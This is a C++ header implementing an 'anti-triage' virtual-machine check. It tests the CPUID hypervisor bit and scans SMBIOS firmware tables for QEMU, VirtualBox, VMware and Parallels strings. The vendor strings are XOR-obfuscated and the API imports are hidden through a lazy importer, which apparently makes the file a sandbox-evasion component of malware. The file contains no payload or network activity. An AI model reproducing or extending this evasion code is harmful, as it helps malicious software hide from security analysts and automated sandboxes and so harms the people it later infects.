#pragma once
#include <windows.h>
#include <intrin.h>

#include "XorStr.hpp"
#include "Lazyimporter.hpp"

// =============================================
//  VmDetect.hpp
//
//  Anti-triage: CPUID hypervisor bit + SMBIOS vendor scan
//  Converted from C# AntiTriage, zero CRT
// =============================================

namespace VmDetect {

    // =============================================
    //  Inline byte-pattern search in buffer
    //  Matches vendor strings without storing them as plaintext
    // =============================================

    __forceinline bool MatchAt(const BYTE* data, DWORD offset, const char* pattern, DWORD patLen) {
        for (DWORD i = 0; i < patLen; i++) {
            if (data[offset + i] != (BYTE)pattern[i])
                return false;
        }
        return true;
    }

    __forceinline bool FindVendor(const BYTE* data, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            // QEMU
            if (i + 4 <= size && MatchAt(data, i, xorstr_("QEMU"), 4))
                return true;
            // innotek (VirtualBox old)
            if (i + 7 <= size && MatchAt(data, i, xorstr_("innotek"), 7))
                return true;
            // VirtualBox
            if (i + 10 <= size && MatchAt(data, i, xorstr_("VirtualBox"), 10))
                return true;
            // VMware
            if (i + 6 <= size && MatchAt(data, i, xorstr_("VMware"), 6))
                return true;
            // Parallels
            if (i + 9 <= size && MatchAt(data, i, xorstr_("Parallels"), 9))
                return true;
            // Virtual Machine (generic SMBIOS product string)
            if (i + 15 <= size && MatchAt(data, i, xorstr_("Virtual Machine"), 15))
                return true;
        }
        return false;
    }

    // =============================================
    //  CPUID check — hypervisor present bit (ECX.31 of leaf 1)
    //
    //  If hypervisor bit set:
    //    - Read leaf 0x40000000 for hypervisor vendor
    //    - If Microsoft Hyper-V, check leaf 0x40000003 bit 0
    //      (CreatePartitions privilege = bare metal with Hyper-V role)
    //    - Otherwise: VM detected
    // =============================================

    __forceinline bool CheckCpuId() {
        int regs[4] = { 0 };

        // Leaf 1: feature bits
        __cpuid(regs, 1);

        // ECX bit 31 = hypervisor present
        if (!((regs[2] >> 31) & 1))
            return false;  // no hypervisor = not VM

        // Hypervisor detected — check vendor
        __cpuid(regs, 0x40000000);

        // "Microsoft Hv" = EBX:ECX:EDX = 0x7263694D : 0x666F736F : 0x76482074
        if (regs[1] == 0x7263694D &&
            regs[2] == 0x666F736F &&
            regs[3] == 0x76482074) {
            // Microsoft hypervisor — check if bare-metal Hyper-V host
            __cpuid(regs, 0x40000003);
            if (regs[1] & 1)  // CreatePartitions privilege = host, not guest
                return false;
        }

        return true;  // hypervisor present and not bare-metal host
    }

    // =============================================
    //  SMBIOS firmware table scan
    //
    //  EnumSystemFirmwareTables('RSMB') lists SMBIOS tables
    //  GetSystemFirmwareTable reads raw data
    //  Scan for known VM vendor strings in the blob
    // =============================================

    __declspec(noinline) bool CheckSmbios() {
        // 'RSMB' signature (little-endian)
        DWORD sig = ((BYTE)'R' << 24) | ((BYTE)'S' << 16) | ((BYTE)'M' << 8) | (BYTE)'B';

        // Use stack buffer to avoid HeapAlloc issues with lazy import
        // Most SMBIOS enum data is small (< 256 bytes)
        BYTE enumBuf[512];

        DWORD size = lzimpLI_FN(EnumSystemFirmwareTables)(sig, (PVOID)enumBuf, sizeof(enumBuf));
        if (size == 0 || size > sizeof(enumBuf))
            return false;

        DWORD count = size / sizeof(DWORD);

        for (DWORD i = 0; i < count; i++) {
            DWORD tableId = ((DWORD*)enumBuf)[i];

            // Query size first
            DWORD dataSize = lzimpLI_FN(GetSystemFirmwareTable)(sig, tableId, (PVOID)NULL, 0);
            if (dataSize == 0 || dataSize > 65536)
                continue;

            // Alloc via VirtualAlloc — more reliable than HeapAlloc via lazy import
            BYTE* dataBuf = (BYTE*)lzimpLI_FN(VirtualAlloc)(
                (LPVOID)NULL, (SIZE_T)dataSize, (DWORD)0x3000, (DWORD)0x04);  // COMMIT|RESERVE, RW
            if (!dataBuf)
                continue;

            lzimpLI_FN(GetSystemFirmwareTable)(sig, tableId, dataBuf, dataSize);

            bool found = FindVendor(dataBuf, dataSize);

            lzimpLI_FN(VirtualFree)(dataBuf, (SIZE_T)0, (DWORD)0x8000);  // MEM_RELEASE

            if (found)
                return true;
        }

        return false;
    }

    // =============================================
    //  Combined check — CPUID first (fast), then SMBIOS
    // =============================================

    __forceinline bool IsVirtualMachine() {
        if (CheckCpuId())
            return true;
        if (CheckSmbios())
            return true;
        return false;
    }

} // namespace VmDetect
